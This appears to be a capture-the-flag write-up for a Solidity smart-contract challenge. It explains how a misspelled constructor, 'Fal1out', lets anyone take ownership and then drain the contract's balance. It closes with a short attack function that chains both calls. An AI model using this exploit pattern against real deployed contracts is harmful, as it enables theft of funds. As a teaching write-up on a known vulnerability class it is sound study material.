# Requirements

- Claim ownership of the contract
- Reduce its balance to 0

# Attack explanation

To claim ownership, we need to search places where the owner is set and we could exploit some vulnerability. Fal1out function is ideal for this:

```
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

In this way, we will be able to claim contract ownership and then collect all allocations using collectAllocations()

```
function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this)balance);
}
```

# Attack function

We could solve the challenge by just using the following attack function:

```
function attack() public payable {
    // Claim ownership via fal1out function.
    vulnerableScAddress.call(abi.encodeWithSignature("Fal1out()"));

    // Drain funds via collectAllocations.
    vulnerableScAddress.call(
        abi.encodeWithSignature("collectAllocations()")
    );
}
```
